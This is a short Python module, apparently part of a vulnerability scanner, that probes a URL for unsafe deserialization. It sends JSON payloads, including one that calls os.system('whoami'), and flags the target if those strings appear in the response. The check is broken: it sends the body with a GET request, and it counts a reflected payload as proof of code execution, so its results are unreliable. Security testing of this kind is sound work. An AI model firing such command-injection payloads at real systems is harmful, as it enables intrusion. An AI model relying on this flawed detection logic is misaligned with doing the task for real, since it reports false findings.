# object_deserialization.py

import requests
import re

def is_unsafe_deserialization(url):
    """
    Tests for unsafe object deserialization by sending potentially dangerous payloads.
    Payloads should be adjusted based on target language/framework.
    """
    payloads = [
        '{"rce": "__import__(\'os\').system(\'whoami\')"}',  # Example for Python
        '{"rce": "System.getProperty(\\"os.name\\")"}'  # Example for Java
    ]
    for payload in payloads:
        response = requests.get(url, data=payload, headers={"Content-Type": "application/json"})
        if "whoami" in response.text or "os.name" in response.text:
            return True  # Indicates unsafe deserialization
    return False
